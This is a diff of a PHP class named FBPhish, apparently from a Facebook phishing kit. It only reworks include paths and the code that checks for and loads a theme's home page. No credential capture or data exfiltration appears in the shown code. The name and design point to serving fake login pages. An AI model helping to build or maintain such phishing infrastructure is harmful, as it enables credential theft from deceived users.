@@ -1,6 +1,5 @@
 <?php
-$apppath = dirname(__FILE__);
-require("$apppath/../main.boot.php");
+require_once(__DIR__ . "/../config.inc.php");
 
 class FBPhish{
 	private $content;
@@ -8,6 +7,7 @@ class FBPhish{
 	private $themecheck_results;
 	private $themecheck_results_i;
 	private $themecheck_results_im;
+	private $apppath;
 
 	public function __construct() {
 
@@ -21,15 +21,19 @@ class FBPhish{
 		global $debug;
 		global $apppath;
 		global $theme;
+		global $apppath;
+
+		$apppath = __DIR__;
+
 
 		$this->themecheck_results = array();
-		if(is_dir("$apppath/themes/$theme")){
+		if(is_dir("$apppath/../themes/$theme")){
 			$this->themecheck_results[] = "<br>Theme folder: Ok";
 		}else{
 			$this->themecheck_results[] = "<br>Theme folder: Missing (\"$theme\")";
 		}
 
-		if(file_exists("$apppath/themes/$theme/home.php")){
+		if(file_exists("$apppath/../themes/$theme/home.php")){
 			$this->themecheck_results[] = "<br>Home page: Ok";
 		}else{
 			$this->themecheck_results[] = "<br>Home page: Missing";
@@ -56,8 +60,11 @@ class FBPhish{
 	public function loadPage($page) {
 		global $theme;
 		global $apppath;
+		global $apppath;
 
-		$this->content = file_get_contents("$apppath/themes/$theme/home.php");
+		$apppath = __DIR__;
+
+		$this->content = file_get_contents("$apppath/../themes/$theme/home.php");
 		return $this->content;
 	}
 }
